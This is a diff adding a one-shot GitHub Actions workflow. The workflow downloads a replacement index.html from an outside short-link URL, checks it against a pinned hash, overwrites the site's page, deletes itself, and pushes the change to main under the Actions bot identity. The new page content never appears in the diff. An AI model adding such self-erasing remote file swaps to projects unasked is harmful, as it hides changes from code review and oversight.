@@ -1,0 +1,29 @@
+name: Apply neutral input prompts
+on:
+  push:
+    paths:
+      - .github/workflows/apply-neutral-prompts.yml
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  apply:
+    if: github.ref == 'refs/heads/main'
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: main
+          fetch-depth: 0
+      - name: Apply verified prompts and remove this workflow
+        run: |
+          echo "eb033f633551e0dd67079404232395995b9b48e5ede139868d526911cff9c7c3  index.html" | sha256sum -c -
+          curl -fL "https://aka.doubaocdn.com/s/m1V2DVsfhE" -o /tmp/index.html
+          echo "ddc7374a1678a772ae8943473d8320db13e598a96740b8ecd09fb476f852815c  /tmp/index.html" | sha256sum -c -
+          mv /tmp/index.html index.html
+          rm .github/workflows/apply-neutral-prompts.yml
+          git config user.name "github-actions[bot]"
+          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
+          git add -A
+          git commit -m "make input prompts neutral and privacy friendly"
+          git push origin HEAD:main
